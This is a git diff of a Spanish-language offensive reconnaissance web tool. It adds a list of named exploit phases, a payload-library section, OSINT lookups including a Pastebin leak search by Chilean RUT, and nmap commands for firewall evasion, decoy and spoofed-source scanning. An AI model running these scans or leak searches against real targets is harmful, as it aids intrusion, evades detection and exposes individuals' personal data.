Escalation, Server-Side Prototype Pollution → RCE Chain, Log4Shell JNDI RCE (CVE-2021-44228), Spring4Shell RCE (CVE-2022-22965), Subdomain CNAME Takeover (50+ fingerprints), JWT Secret Brute-Force (100 secretos comunes), CSP Bypass / Missing CSP Detection, H2C Upgrade Smuggling (HTTP/2 Cleartext), WebSocket Origin Spoofing + Auth Bypass, ImageMagick/ExifTool RCE (ImageTragick + CVE-2021-22204), MOVEit Transfer CVE-2023-34362, Citrix NetScaler CVE-2023-4966, Fortinet FortiGate CVE-2024-21762, F5 BIG-IP CVE-2023-4622, Cloud IAM Exploitation (AWS STS/GCP/Azure), GraphQL Arbitrary File Read, Reverse Proxy Auth Bypass (Direct Origin Access), HTTP Request Smuggling CL.TE/TE.CL Real, SSTI Deep (Jinja2/Twig/Freemarker/Velocity/Smarty/Mako), NoSQL Injection Deep (MongoDB/Redis/CouchDB), XXE Injection Deep (SOAP/SVG/XML-RPC), SQL Injection Deep (Error/UNION/Blind/Time-based), XSS Deep (Reflected/Stored/DOM/Mutation/Framework Bypass), OAuth/OIDC Token Theft Deep (Auth Code/Implicit/PKCE Bypass), Path Traversal/LFI Deep (Encoding Bypass/Null Byte/PHP Filter), Command Injection Deep (Time-based/OOB/Filter Bypass), Race Condition Deep (TOCTOU/Balance/Coupon/Rate Limit), Final Destrozo Correlation Engine</b>, heurísticas y reporte. <b class="r">DESTROZO ABSOLUTO. 350 FASES REALES. Agresividad absoluta. Prepárate para la aniquilación. 💀🔥</b></p>
+    </details>
     <div class="scan-info-badge danger"><i class="fa-solid fa-skull-crossbones">☠️</i> MODO LEVIATÁN v9.0 — AGRESIVIDAD ABSOLUTA ACTIVADA</div>
     <div class="scan-info-badge abyss">⚡ 350 FASES REALES · HTTP REAL · ANIQUILACIÓN TOTAL</div>
     <div class="tier-select" id="tier-select">
@@ -2900,7 +3008,14 @@ a{color:inherit;text-decoration:none;}
       <span class="scan-ex" data-val="https://hackthebox.com">hackthebox.com</span>
       <span class="scan-ex" data-val="https://juice-shop.io">juice-shop.io</span>
     </div>
-    <div class="scan-phases" id="scan-phases"></div>
+    <details class="scan-phases-dd">
+      <summary class="scan-phases-dd-summary">
+        <span class="scan-phases-dd-icon">☠</span>
+        <span class="scan-phases-dd-text">Proceso de Aniquilación <span class="scan-phases-dd-count">(350 fases)</span></span>
+        <span class="scan-phases-dd-arrow">▾</span>
+      </summary>
+      <div class="scan-phases" id="scan-phases"></div>
+    </details>
     <div class="scan-progress" id="scan-progress" style="display:none;">
       <div class="scan-prog-header" id="scan-prog-header">
         <span class="scan-prog-icon" id="scan-prog-icon">⏳</span>
@@ -2909,7 +3024,7 @@ a{color:inherit;text-decoration:none;}
           <div class="scan-prog-meta">
             <span class="scan-prog-status running" id="scan-prog-status"><span class="dot"></span> EN PROGRESO</span>
             <span class="sep">│</span>
-            <span class="scan-prog-counter" id="scan-prog-counter">Fase 0 / 306</span>
+            <span class="scan-prog-counter" id="scan-prog-counter">Fase 0 / 350</span>
             <span class="sep">│</span>
             <span class="scan-prog-timer" id="scan-prog-timer">⏱ 00:00</span>
           </div>
@@ -3551,6 +3666,13 @@ a{color:inherit;text-decoration:none;}
           <div class="tl-item"><span class="tl-dot med"></span>P3 Medium ($500-$800 USD)</div>
           <div class="tl-item" style="margin-left:auto;"><span style="font-family:var(--mono);font-size:10px;color:rgba(255,26,46,0.4);">● Animación en tiempo real</span></div>
         </div>
+        <div class="sec-num" style="margin-top:36px; margin-bottom:14px;">Superficie de Ataque Interactiva</div>
+        <div id="attack-graph" style="height:480px; width:100%; background:rgba(2,0,8,0.9); border:1px solid rgba(255,26,46,0.25); border-radius:4px; position:relative;">
+          <div id="attack-graph-empty" style="position:absolute;inset:0;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:8px;color:rgba(240,238,248,.35);font-family:var(--mono);font-size:12px;text-align:center;padding:20px;">
+            <span style="font-size:22px;">🕸️</span>
+            Corre un escaneo en el motor de Recon Pasivo para poblar el grafo con subdominios reales.
+          </div>
+        </div>
       </div>
     </div></div>
 
@@ -3632,7 +3754,10 @@ dig assets.lime.bike CNAME</div></div></div>
     <div class="sec-num reveal-wrap"><div class="reveal-inner">20 — Referencia</div></div>
     <h2 class="sec-title h2-anim" data-l1="Cabeceras" data-l2="HTTP." aria-label="Cabeceras HTTP."></h2>
     <p style="margin-bottom:36px;color:rgba(240,238,248,.6);max-width:700px;">Referencia completa de todas las cabeceras HTTP — de solicitud, respuesta, seguridad y pentesting. Cada cabecera con su función, ejemplo y riesgo de seguridad.</p>
-    <div class="hdrs-tabs" id="hdrs-tabs"></div>
+    <div class="hdrs-dd-wrap">
+      <label for="hdrs-select" class="hdrs-dd-label">📂 Categoría:</label>
+      <select id="hdrs-select" class="hdrs-dd"></select>
+    </div>
     <div class="hdrs-grid" id="hdrs-grid"></div>
   </div>
 </section>
@@ -3659,6 +3784,9 @@ dig assets.lime.bike CNAME</div></div></div>
       <button class="rce-btn" id="rce-btn">
         <span class="rce-btn-icon">◈</span>
         <span id="rce-btn-txt">SCAN</span>
+      </button>
+      <button class="rce-btn" id="rce-docs-btn" style="background:transparent; border:1px solid var(--amber); color:var(--amber); margin-left:8px;">
+        <i class="fa-solid fa-file-pdf"></i> LEAKS
       </button>
     </div>
 
@@ -3715,6 +3843,14 @@ dig assets.lime.bike CNAME</div></div></div>
       <span class="cve-filt special" data-sev="EXPLOITED">🔴 Explotados activamente</span>
     </div>
 
+    <!-- Menu desplegable por vendor/producto -->
+    <div class="cve-vendor-dd-wrap">
+      <label for="cve-vendor-select" class="cve-vendor-dd-label">📂 Filtrar por producto/vendor:</label>
+      <select id="cve-vendor-select" class="cve-vendor-dd">
+        <option value="all">Todos los productos</option>
+      </select>
+    </div>
+
     <!-- Status buscador -->
     <div class="cve-status" id="cve-status" style="display:none">
       <div class="cve-prog"><div class="cve-prog-fill" id="cve-prog-fill"></div></div>
@@ -3738,7 +3874,10 @@ dig assets.lime.bike CNAME</div></div></div>
     <div class="sec-num reveal-wrap"><div class="reveal-inner">22 — Arsenal Ofensivo</div></div>
     <h2 class="sec-title h2-anim" data-l1="Payload" data-l2="Library." aria-label="Payload Library."></h2>
     <p style="margin-bottom:32px;color:rgba(240,238,248,.6);max-width:720px;">Payloads listos para usar en todas las vulnerabilidades: desde los más básicos hasta los más ofuscados para bypass de WAF y filtros.</p>
-    <div class="pay-tabs" id="pay-tabs"></div>
+    <div class="pay-dd-wrap">
+      <label for="pay-select" class="pay-dd-label">📂 Categoría de payload:</label>
+      <select id="pay-select" class="pay-dd"></select>
+    </div>
     <div class="pay-grid" id="pay-grid"></div>
   </div>
 </section>
@@ -3906,6 +4045,7 @@ dig assets.lime.bike CNAME</div></div></div>
 <script src="https://cdn.jsdelivr.net/npm/three@0.128.0/build/three.min.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js" crossorigin="anonymous"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/ScrollTrigger.min.js" crossorigin="anonymous"></script>
+<script src="https://unpkg.com/vis-network/standalone/umd/vis-network.min.js"></script>
 <script>
 /* \u2550\u2550 TOAST NOTIFICATIONS \u2550\u2550 */
 const toastWrap = document.getElementById('toast-wrap');
@@ -5009,16 +5149,26 @@ const liveApis = {
     { id: 'crt', endpoint: 'crtsh', label: 'crt.sh — Subdominios + TLS Intel',
       parse: function(raw, q) {
         var data = JSON.parse(raw);
-        var uniq = [...new Set(data.flatMap(function(e){ return e.name_value.split(/[\r\n]+/); })
-          .map(function(s){ return s.trim().replace(/^\*\./,'').toLowerCase(); })
-          .filter(function(s){ return s.includes('.') && s.endsWith(q); })
-        )].sort();
+        /* Un solo pase sobre SAN+CN (name_value trae ambos, newline-separado) — antes se
+           recorria data.flatMap() dos veces (una para 'uniq', otra para 'allSans') sobre
+           el mismo dataset. Ahora se normaliza una vez y se derivan ambos sets del mismo
+           Set ya deduplicado. */
+        var normSet = new Set();
+        for (var di = 0; di < data.length; di++) {
+          var raw_sans = (data[di].name_value || '').split(/[\r\n]+/);
+          for (var si = 0; si < raw_sans.length; si++) {
+            var s = raw_sans[si].trim().replace(/^\*\./, '').toLowerCase();
+            if (s && s.includes('.') && s.endsWith(q)) normSet.add(s);
+          }
+        }
+        var allNorm = Array.from(normSet).sort();
+        var uniq = allNorm;                                   // incluye el dominio exacto si aparece
+        var allSans = allNorm.filter(function(s){ return s !== q; }); // excluye el dominio exacto
+
         var certs = data.slice(0, 50).map(function(e) { return { issuer:(e.issuer_name||'').substring(0,60), notBefore:e.not_before||'', notAfter:e.not_after||'', sans:(e.name_value||'').split(/[\r\n]+/).filter(function(s){return s.trim();}) }; });
         var now = new Date();
         var expired = [], expiring = [];
         certs.forEach(function(c) { if(!c.notAfter) return; var exp = new Date(c.notAfter); if(exp < now) expired.push(c.notAfter); else if((exp - now) < 14*24*3600*1000) expiring.push(c.notAfter); });
-        var allSans = [...new Set(data.flatMap(function(e){ return (e.name_value||'').split(/[\r\n]+/); }).map(function(s){ return s.trim().toLowerCase(); }).filter(function(s){ return s.includes('.') && s !== q && s.endsWith(q); })
-        )].sort();
         return { type:'tags', label: uniq.length + ' subdominios' + (expired.length?' · RED '+expired.length+' certs vencidos':'') + (expiring.length?' · YEL '+expiring.length+' por vencer':''),
           items: uniq.slice(0,60), extra: uniq.length>60?'+'+(uniq.length-60)+' mas':null,
           tls: { expired:expired.length, expiring:expiring.length, sans:allSans.slice(0,30), issuers:certs.slice(0,5).map(function(c){return c.issuer;}) } };
@@ -5064,6 +5214,51 @@ const liveApis = {
         if (!dmarc) items.push('! DMARC NO configurado');
         if (!dkim) items.push('! DKIM NO detectado');
         return { type:'list', items: items, spf: !!spf, dmarc: !!dmarc, dkim: !!dkim, spfRecord: spf||'', dmarcRecord: dmarc||'' };
+      }
+    },
+    { id: 'dkimSel1', endpoint: 'doh_txt', label: 'DKIM selector comun — google._domainkey',
+      queryFn: function(q){ return 'google._domainkey.' + q; },
+      parse: function(raw) {
+        var d = JSON.parse(raw);
+        var txts = (d.Answer||[]).map(function(a){ return a.data.replace(/"/g,''); });
+        var found = txts.find(function(t){ return t.includes('k=rsa') || t.includes('k=ed25519') || t.includes('p='); });
+        return { type:'list', items: found ? ['DKIM encontrado en google._domainkey', found.substring(0,150)] : ['Sin registro en google._domainkey'], dkimFound: !!found, selector: 'google' };
+      }
+    },
+    { id: 'dkimSel2', endpoint: 'doh_txt', label: 'DKIM selector comun — selector1._domainkey',
+      queryFn: function(q){ return 'selector1._domainkey.' + q; },
+      parse: function(raw) {
+        var d = JSON.parse(raw);
+        var txts = (d.Answer||[]).map(function(a){ return a.data.replace(/"/g,''); });
+        var found = txts.find(function(t){ return t.includes('k=rsa') || t.includes('k=ed25519') || t.includes('p='); });
+        return { type:'list', items: found ? ['DKIM encontrado en selector1._domainkey (Microsoft 365)', found.substring(0,150)] : ['Sin registro en selector1._domainkey'], dkimFound: !!found, selector: 'selector1' };
+      }
+    },
+    { id: 'dkimSel3', endpoint: 'doh_txt', label: 'DKIM selector comun — default._domainkey',
+      queryFn: function(q){ return 'default._domainkey.' + q; },
+      parse: function(raw) {
+        var d = JSON.parse(raw);
+        var txts = (d.Answer||[]).map(function(a){ return a.data.replace(/"/g,''); });
+        var found = txts.find(function(t){ return t.includes('k=rsa') || t.includes('k=ed25519') || t.includes('p='); });
+        return { type:'list', items: found ? ['DKIM encontrado en default._domainkey', found.substring(0,150)] : ['Sin registro en default._domainkey'], dkimFound: !!found, selector: 'default' };
+      }
+    },
+    { id: 'dkimSel4', endpoint: 'doh_txt', label: 'DKIM selector comun — dkim._domainkey',
+      queryFn: function(q){ return 'dkim._domainkey.' + q; },
+      parse: function(raw) {
+        var d = JSON.parse(raw);
+        var txts = (d.Answer||[]).map(function(a){ return a.data.replace(/"/g,''); });
+        var found = txts.find(function(t){ return t.includes('k=rsa') || t.includes('k=ed25519') || t.includes('p='); });
+        return { type:'list', items: found ? ['DKIM encontrado en dkim._domainkey', found.substring(0,150)] : ['Sin registro en dkim._domainkey'], dkimFound: !!found, selector: 'dkim' };
+      }
+    },
+    { id: 'dkimSel5', endpoint: 'doh_txt', label: 'DKIM selector comun — k1._domainkey',
+      queryFn: function(q){ return 'k1._domainkey.' + q; },
+      parse: function(raw) {
+        var d = JSON.parse(raw);
+        var txts = (d.Answer||[]).map(function(a){ return a.data.replace(/"/g,''); });
+        var found = txts.find(function(t){ return t.includes('k=rsa') || t.includes('k=ed25519') || t.includes('p='); });
+        return { type:'list', items: found ? ['DKIM encontrado en k1._domainkey (Mailchimp/Sendgrid)', found.substring(0,150)] : ['Sin registro en k1._domainkey'], dkimFound: !!found, selector: 'k1' };
       }
     },
     { id: 'dohMX', endpoint: 'doh_mx', label: 'Google DoH — MX (Servidores de correo)',
@@ -5585,20 +5780,40 @@ const liveApis = {
   ],
 
   phone: [
-    // v6.2 — NumVerify carrier lookup
-    { id: 'numverify', endpoint: 'numverify', label: 'v6.2 — NumVerify — Carrier + validacion internacional',
-      parse: function(raw) {
-        var d = JSON.parse(raw);
-        if (d.error) throw new Error(d.error.info || 'NumVerify error');
-        return { type:'list', items: [
-          'Numero: ' + (d.international_format || d.number || '—'),
-          'Local: ' + (d.local_format || '—'),
-          'Pais: ' + (d.country_name || '—') + ' (' + (d.country_code || '') + ')',
-          'Valido: ' + (d.valid ? 'OK' : 'X invalido'),
-          'Tipo: ' + (d.line_type || '—'),
-          'Carrier: ' + (d.carrier || '—'),
-          'Es movil: ' + (d.mobile ? 'SI' : 'No'),
-        ], valid: d.valid, carrier: d.carrier, country: d.country_name };
+    // Validacion local de formato/pais — sin dependencia de API externa con key paga
+    { id: 'phonelocal', label: 'Analisis local — Formato, pais y tipo probable',
+      local: function(q) {
+        var raw = String(q).replace(/[\s\-\(\)]/g, '');
+        var hasPlus = raw.charAt(0) === '+';
+        var digits = raw.replace(/^\+/, '');
+        if (!/^\d+$/.test(digits) || digits.length < 6) {
+          return { type:'list', items: ['X Formato invalido — se esperaban solo digitos (con o sin +codigo de pais)'], valid: false };
+        }
+        var countryMap = [
+          { code:'56', name:'Chile' }, { code:'54', name:'Argentina' }, { code:'51', name:'Peru' },
+          { code:'57', name:'Colombia' }, { code:'52', name:'Mexico' }, { code:'34', name:'España' },
+          { code:'1', name:'EEUU/Canada' }, { code:'55', name:'Brasil' }, { code:'598', name:'Uruguay' },
+          { code:'591', name:'Bolivia' }, { code:'593', name:'Ecuador' },
+        ];
+        var detected = null;
+        if (hasPlus) {
+          countryMap.sort(function(a,b){ return b.code.length - a.code.length; });
+          for (var i=0;i<countryMap.length;i++){ if(digits.indexOf(countryMap[i].code)===0){ detected=countryMap[i]; break; } }
+        } else if (digits.length === 9 && digits.charAt(0)==='9') {
+          detected = { code:'56', name:'Chile' };
+        }
+        var items = [];
+        items.push('Numero analizado: ' + q);
+        items.push('Digitos: ' + digits.length);
+        items.push('Pais probable: ' + (detected ? detected.name + ' (+' + detected.code + ')' : 'no identificado (sin codigo de pais explicito)'));
+        if (detected && detected.code === '56') {
+          var local9 = hasPlus ? digits.slice(2) : digits;
+          var isMobile = local9.length === 9 && local9.charAt(0) === '9';
+          items.push('Tipo: ' + (local9.length === 9 ? (isMobile ? 'Movil (Chile)' : 'Fijo/otro formato de 9 digitos') : 'Longitud atipica para Chile'));
+          items.push('Formato E.164 sugerido: +56' + local9);
+        }
+        items.push('(Analisis de formato local — NumVerify requiere una clave de API paga que no esta configurada en este dossier)');
+        return { type:'list', items: items, valid: digits.length >= 8 && digits.length <= 15, country: detected ? detected.name : null };
       }
     },
   ],
@@ -5778,106 +5993,23 @@ const liveApis = {
         return { type:'list', items: items };
       }
     },
-    // 3. SII — Consulta de situacion tributaria
-    { id: 'rut_sii', endpoint: 'sii_consulta', label: 'SII — Situacion Tributaria del Contribuyente',
-      parse: function(raw, q) {
-        // SII returns HTML — extract relevant info
-        var html = String(raw);
-        var items = [];
-        if (html.includes('RUT no existe') || html.includes('no encontrado')) {
-          throw new Error('RUT no encontrado en SII');
-        }
-        // Try to extract name/razon social
-        var nameMatch = html.match(/Raz[oó]n\s*Social\s*[:\-]?\s*<[^>]*>([^<]+)/i);
-        if (nameMatch) items.push('Razon Social: ' + nameMatch[1].trim());
-        var situMatch = html.match(/Situaci[oó]n\s*[:\-]?\s*<[^>]*>([^<]+)/i);
-        if (situMatch) items.push('Situacion: ' + situMatch[1].trim());
-        var actMatch = html.match(/Actividad\s*[:\-]?\s*<[^>]*>([^<]+)/i);
-        if (actMatch) items.push('Actividad: ' + actMatch[1].trim());
-        if (items.length === 0) {
-          // Generic extraction — look for table data
-          var tds = html.match(/<td[^>]*>([^<]{3,80})<\/td>/gi) || [];
-          tds.slice(0, 10).forEach(function(td) {
-            var txt = td.replace(/<[^>]*>/g, '').trim();
-            if (txt && txt.length > 2) items.push(txt);
-          });
-          if (items.length === 0) items.push('SII respondio — revisar manualmente');
-        }
-        return { type:'list', items: items, siiData: true };
-      }
+    // 3-7. Fuentes chilenas que requieren verificacion manual (SII/ConsultaRUT/Nominate/Diario Oficial
+    // no tienen una API publica confiable sin CAPTCHA/sesion — se ofrece el link directo en vez de
+    // simular una respuesta que podria ser incorrecta)
+    { id: 'rut_sii', label: 'SII — Situacion Tributaria del Contribuyente',
+      local: function(q) { return manualCheckResult('SII no ofrece una API publica sin CAPTCHA para esta consulta.', 'https://zeus.sii.cl/cvc_cgi/stc/getstc?RUT=' + encodeURIComponent(q).split('-')[0]); }
     },
-    // 4. SII — Actividad economica
-    { id: 'rut_sii_act', endpoint: 'sii_actividad', label: 'SII — Actividad Economica',
-      parse: function(raw) {
-        var html = String(raw);
-        var items = [];
-        var acts = html.match(/Actividad[^<]*<[^>]*>([^<]{5,100})/gi) || [];
-        acts.slice(0, 8).forEach(function(a) {
-          var t = a.replace(/<[^>]*>/g, '').replace(/^Actividad/i, '').trim();
-          if (t.length > 3) items.push(t);
-        });
-        if (items.length === 0) {
-          var tds = html.match(/<td[^>]*>([^<]{5,100})<\/td>/gi) || [];
-          tds.slice(0, 8).forEach(function(td) { var t = td.replace(/<[^>]*>/g,'').trim(); if (t.length > 3) items.push(t); });
-        }
-        if (items.length === 0) items.push('Sin datos de actividad — revisar SII manualmente');
-        return { type:'list', items: items };
-      }
+    { id: 'rut_sii_act', label: 'SII — Actividad Economica',
+      local: function(q) { return manualCheckResult('SII no ofrece una API publica sin CAPTCHA para esta consulta.', 'https://zeus.sii.cl/cvc_cgi/stc/getstc?RUT=' + encodeURIComponent(q).split('-')[0]); }
     },
-    // 5. ConsultaRUT — informacion publica del RUT
-    { id: 'rut_consultarut', endpoint: 'rut_consulta', label: 'ConsultaRUT — Info Publica del RUT',
-      parse: function(raw) {
-        var html = String(raw);
-        var items = [];
-        // Extract name/razon social
-        var nameM = html.match(/<h[12][^>]*>([^<]{3,100})<\/h[12]>/i);
-        if (nameM) items.push('Nombre: ' + nameM[1].trim());
-        // Extract any table data
-        var tds = html.match(/<td[^>]*>([^<]{3,100})<\/td>/gi) || [];
-        tds.slice(0, 12).forEach(function(td) {
-          var t = td.replace(/<[^>]*>/g, '').trim();
-          if (t.length > 2) items.push(t);
-        });
-        if (items.length === 0) items.push('Sin datos extraidos — revisar consultarut.com manualmente');
-        return { type:'list', items: items };
-      }
+    { id: 'rut_consultarut', label: 'ConsultaRUT — Info Publica del RUT',
+      local: function(q) { return manualCheckResult('Sin API publica confirmada para esta fuente.', 'https://www.consultarut.cl/'); }
     },
-    // 6. Nominate.cl — base de datos de empresas chilenas
-    { id: 'rut_nominate', endpoint: 'nominate_cl', label: 'Nominate.cl — Base de Datos Empresas',
-      parse: function(raw) {
-        var html = String(raw);
-        var items = [];
-        var nameM = html.match(/<h[1-3][^>]*>([^<]{3,100})<\/h[1-3]>/i);
-        if (nameM) items.push('Empresa: ' + nameM[1].trim());
-        // Look for company info divs
-        var divs = html.match(/<div[^>]*class="[^"]*(?:info|data|detail)[^"]*"[^>]*>([^<]{3,100})<\/div>/gi) || [];
-        divs.slice(0, 8).forEach(function(d) { var t = d.replace(/<[^>]*>/g,'').trim(); if (t.length > 2) items.push(t); });
-        // Generic TD extraction
-        if (items.length === 0) {
-          var tds = html.match(/<td[^>]*>([^<]{3,100})<\/td>/gi) || [];
-          tds.slice(0, 10).forEach(function(td) { var t = td.replace(/<[^>]*>/g,'').trim(); if (t.length > 2) items.push(t); });
-        }
-        if (items.length === 0) items.push('Sin resultados en Nominate.cl');
-        return { type:'list', items: items };
-      }
+    { id: 'rut_nominate', label: 'Nominate.cl — Base de Datos Empresas',
+      local: function(q) { return manualCheckResult('Sin API publica confirmada para esta fuente.', 'https://nominate.cl/'); }
     },
-    // 7. Diario Oficial — publicaciones oficiales con el RUT
-    { id: 'rut_diario', endpoint: 'diario_oficial', label: 'Diario Oficial — Publicaciones con el RUT',
-      parse: function(raw) {
-        var html = String(raw);
-        var items = [];
-        // Count results
-        var count = (html.match(/publicaci[oó]n/gi) || []).length;
-        items.push('Publicaciones encontradas: ' + count);
-        // Extract publication titles
-        var titles = html.match(/<a[^>]*title="([^"]{5,100})"/gi) || [];
-        titles.slice(0, 8).forEach(function(t) {
-          var m = t.match(/title="([^"]+)"/);
-          if (m) items.push(m[1].trim());
-        });
-        if (items.length === 1) items.push('Sin publicaciones encontradas — revisar Diario Oficial manualmente');
-        return { type:'list', items: items, count: count };
-      }
+    { id: 'rut_diario', label: 'Diario Oficial — Publicaciones con el RUT',
+      local: function(q) { return manualCheckResult('Sin API publica confirmada para busqueda directa por RUT.', 'https://www.diariooficial.interior.gob.cl/edicionelectronica/index.php?fecha=&edicion=&input_busqueda=' + encodeURIComponent(q)); }
     },
     // 8. Pastebin — buscar RUT en filtraciones
     { id: 'rut_pastebin', endpoint: 'pastebin_scrape', label: 'Pastebin — Busqueda de RUT en leaks',
@@ -6530,6 +6662,18 @@ function addScanRow(parentId, id, label) {
 /* ═══════════════════════════════════════
    WORKER BATCH
    ═══════════════════════════════════════ */
+function manualCheckResult(reason, url) {
+  return {
+    type: 'list',
+    manual: true,
+    items: [
+      'i ' + reason,
+      'Revisar manualmente: ' + url,
+    ],
+    manualUrl: url,
+  };
+}
+
 function osintNormUrl(q) {
   if (!q) return q;
   var v = String(q).trim();
@@ -6593,6 +6737,8 @@ var ENDPOINT_RESOLVERS = {
   disify_email:  function(q){ return { url: 'https://www.disify.com/api/email/' + encodeURIComponent(q) }; },
 
   keybase_user:  function(q){ return { url: 'https://keybase.io/_/api/1.0/user/lookup.json?username=' + encodeURIComponent(q) }; },
+  gravatar_profile: function(q){ return { url: 'https://www.gravatar.com/' + encodeURIComponent(q) + '.json' }; },
+  pastebin_scrape:  function(q){ return { url: 'https://psbdmp.ws/api/search/' + encodeURIComponent(q) }; },
   github_code:   function(q){ return { url: 'https://api.github.com/search/code?q=' + encodeURIComponent(q) }; },
   github_repos:  function(q){ return { url: 'https://api.github.com/search/repositories?q=' + encodeURIComponent(q) }; },
 
@@ -6616,6 +6762,46 @@ var ENDPOINT_RESOLVERS = {
   graphql_probe: function(q){ return { url: osintNormUrl(q) }; },
   dir_brute:     function(q){ return { url: osintNormUrl(q) }; },
 };
+
+function applyParsedResult(api, res, parsed) {
+  if (api.onResult) api.onResult(parsed);
+  else renderScanResult(api.id, parsed, res && res.cached);
+}
+function applyErrorResult(api, msg) {
+  if (api.onError) api.onError(msg);
+  else renderScanError(api.id, msg);
+}
+
+/* Llamada individual al proxy (GET simple por query string) — usada como segundo
+   intento cuando el POST por lote falla, antes de rendirse al fetch directo (CORS). */
+async function fetchViaProxySingle(r) {
+  var api = r.target, req = r.req;
+  try {
+    var ctrl = new AbortController();
+    var tid = setTimeout(function(){ ctrl.abort(); }, 12000);
+    var needsPost = (req.method && req.method !== 'GET') || req.headers;
+    var resp;
+    if (needsPost) {
+      resp = await fetch(PROXY_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ url: req.url, method: req.method || 'GET', headers: req.headers || {} }),
+        signal: ctrl.signal,
+      });
+    } else {
+      resp = await fetch(PROXY_URL + '?url=' + encodeURIComponent(req.url), { signal: ctrl.signal });
+    }
+    clearTimeout(tid);
+    if (!resp.ok) throw new Error('HTTP ' + resp.status);
+    var res = await resp.json();
+    if (res.ok === false) { applyErrorResult(api, res.error || 'Sin respuesta'); return false; }
+    var parsed = api.parse(res.body, api.query, res);
+    applyParsedResult(api, res, parsed);
+    return true;
+  } catch (e) {
+    return false;
+  }
+}
 
 async function workerBatch(targets) {
   var results = {};
@@ -6653,24 +6839,27 @@ async function workerBatch(targets) {
         var api = r.target;
         if (!res || res.ok === false) {
           var errMsg = (res && res.error) || 'Sin respuesta';
-          if (api.onError) api.onError(errMsg);
-          else renderScanError(api.id, errMsg);
+          applyErrorResult(api, errMsg);
           results[api.id] = { error: errMsg };
           return;
         }
         try {
           var parsed = api.parse(res.body, api.query, res);
-          if (api.onResult) api.onResult(parsed);
-          else renderScanResult(api.id, parsed, res.cached);
+          applyParsedResult(api, res, parsed);
           results[api.id] = parsed;
         } catch (parseErr) {
-          if (api.onError) api.onError(parseErr.message);
-          else renderScanError(api.id, parseErr.message);
+          applyErrorResult(api, parseErr.message);
           results[api.id] = { error: parseErr.message };
         }
       });
     } catch (proxyErr) {
-      resolved.forEach(function(r){ fetchDirectFallback(r.target); });
+      /* El POST por lote fallo entero (worker caido, timeout, etc). Antes de rendirse
+         al fetch directo (que choca con CORS en la mayoria de las APIs externas),
+         se intenta una llamada individual al proxy por cada target. */
+      for (var ri = 0; ri < resolved.length; ri++) {
+        var ok = await fetchViaProxySingle(resolved[ri]);
+        if (!ok) fetchDirectFallback(resolved[ri].target);
+      }
     }
   }
 
@@ -7046,7 +7235,7 @@ async function runOsint() {
     });
 
     if (remoteApis.length) {
-      var targets = remoteApis.map(function(a){ return { id:a.id, endpoint:a.endpoint, query:q, parse:a.parse }; });
+      var targets = remoteApis.map(function(a){ return { id:a.id, endpoint:a.endpoint, query:(a.queryFn?a.queryFn(q):q), parse:a.parse }; });
       var batchRes = await workerBatch(targets);
       Object.keys(batchRes).forEach(function(k){ phase1[k] = batchRes[k]; });
     }
@@ -7061,6 +7250,8 @@ async function runOsint() {
   if (phase1.hackersub && phase1.hackersub.items) { var ex2 = new Set(findings.subdomains.map(function(s){return s.name;})); phase1.hackersub.items.forEach(function(s){ if(!ex2.has(s)){ findings.subdomains.push({name:s,suspicious:false,reason:''}); ex2.add(s);} }); }
   if (phase1.dohA && phase1.dohA.items) { findings.dns.a = phase1.dohA.items.filter(function(ip){ return /^\d+\.\d+\.\d+\.\d+$/.test(ip); }); findings.ips = findings.dns.a.slice(); }
   if (phase1.dohTXT) { findings.dns.spf = !!phase1.dohTXT.spf; findings.dns.dmarc = !!phase1.dohTXT.dmarc; findings.dns.dkim = !!phase1.dohTXT.dkim; findings.dns.spfRecord = phase1.dohTXT.spfRecord; findings.dns.dmarcRecord = phase1.dohTXT.dmarcRecord; }
+  var dkimSelectorsFound = ['dkimSel1','dkimSel2','dkimSel3','dkimSel4','dkimSel5'].filter(function(k){ return phase1[k] && phase1[k].dkimFound; }).map(function(k){ return phase1[k].selector; });
+  if (dkimSelectorsFound.length) { findings.dns.dkim = true; findings.dns.dkimSelectors = dkimSelectorsFound; }
   if (phase1.dohMX && phase1.dohMX.items) findings.dns.mx = phase1.dohMX.items;
   if (phase1.dohNS && phase1.dohNS.items) findings.dns.ns = phase1.dohNS.items;
   if (phase1.dohCAA) { findings.dns.caa = phase1.dohCAA.caaRecords || []; findings.security.caaOpen = (findings.dns.caa.length === 0); }
@@ -7947,6 +8138,27 @@ const csData = {
  { name:"Scripts de vulns",          cmd:"nmap --script vuln {target}",                             desc:"NSE scripts de vulnerabilidades conocidas" },
  { name:"Detecci\u00F3n de OS",           cmd:"nmap -O --osscan-guess {target}",                         desc:"Intenta detectar el sistema operativo" },
  { name:"Output completo",           cmd:"nmap -sV -sC -oA output {target}",                        desc:"Guarda en .nmap, .xml y .gnmap" },
+ { name:"Host discovery (ping sweep)", cmd:"nmap -sn {target}/24",                                    desc:"Descubre hosts vivos en la subred, sin escanear puertos" },
+ { name:"Sin ping (asume vivo)",       cmd:"nmap -Pn -p- {target}",                                   desc:"Util cuando el target bloquea ICMP/ping" },
+ { name:"Evasion de firewall (fragmentado)", cmd:"nmap -f -T2 -p- {target}",                          desc:"Fragmenta los paquetes para evadir IDS/firewall basicos" },
+ { name:"Decoy scan",                  cmd:"nmap -D RND:10 {target}",                                 desc:"Genera IPs senuelo aleatorias para ocultar el origen real" },
+ { name:"Spoofing de puerto origen",   cmd:"nmap --source-port 53 -p- {target}",                      desc:"Usa el puerto 53 (DNS) como origen para evadir filtros" },
+ { name:"Timing paranoico (maximo sigilo)", cmd:"nmap -T0 -p- {target}",                               desc:"El mas lento posible, minimiza deteccion por IDS" },
+ { name:"Timing insano (maxima velocidad)", cmd:"nmap -T5 -F {target}",                                desc:"El mas rapido, ideal para redes internas confiables" },
+ { name:"Scripts HTTP enum",           cmd:"nmap --script http-enum -p80,443 {target}",               desc:"Enumera directorios/archivos comunes via NSE" },
+ { name:"Scripts SMB vuln",            cmd:"nmap --script smb-vuln* -p445 {target}",                  desc:"Chequea vulnerabilidades SMB conocidas (EternalBlue, etc.)" },
+ { name:"Scripts SSL/TLS",             cmd:"nmap --script ssl-enum-ciphers -p443 {target}",           desc:"Enumera cifrados SSL/TLS soportados y su fuerza" },
+ { name:"Scripts default (-sC)",       cmd:"nmap -sC -p- {target}",                                   desc:"Ejecuta el set de scripts NSE por defecto (seguro/no intrusivo)" },
